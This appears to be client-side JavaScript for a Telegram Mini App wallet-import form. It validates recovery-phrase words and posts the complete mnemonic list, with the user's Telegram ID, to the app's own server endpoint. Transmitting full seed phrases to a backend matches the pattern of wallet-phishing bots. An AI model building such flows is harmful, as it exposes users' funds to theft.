const tg = window.Telegram.WebApp;
const userId = tg.initDataUnsafe.user.id;
const indentForKeyboard = document.querySelector('.indent-for-keyboard');

const isMobile = tg.platform === 'mobile' || window.innerWidth < 600;

if (isMobile) {
    indentForKeyboard.style.paddingBottom = '40vh';
}

document.getElementById('import-wallet-button').addEventListener('click', function(event) {
    event.preventDefault();

    let isValid = true;
    const formGroups = document.querySelectorAll('.form-group');
    const inputs = document.querySelectorAll('#mnemonic-form input[type="text"]');
    const mnemonics = [];

    inputs.forEach((input, index) => {
        const formGroup = formGroups[index];
        if (/\s/.test(input.value) || input.value.trim() === '') {
            isValid = false;
            formGroup.style.border = '2px solid #dc3545';
        } else {
            formGroup.style.border = '2px solid transparent';
            mnemonics.push(input.value.trim());
        }
    });

    if (isValid) {
        const mnemonicsModel = {
            'user_id': userId,
            'mnemonics': mnemonics
        };

        const baseUrl = window.location.origin;
        fetch(`${baseUrl}/api/wallet_setup/check_mnemonics`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(mnemonicsModel)
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = `/redirect?user_id=${userId}`;
                } else {
                    inputs.forEach((input, index) => {
                        const formGroup = formGroups[index];
                        formGroup.style.border = '2px solid #dc3545';
                    });
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }
});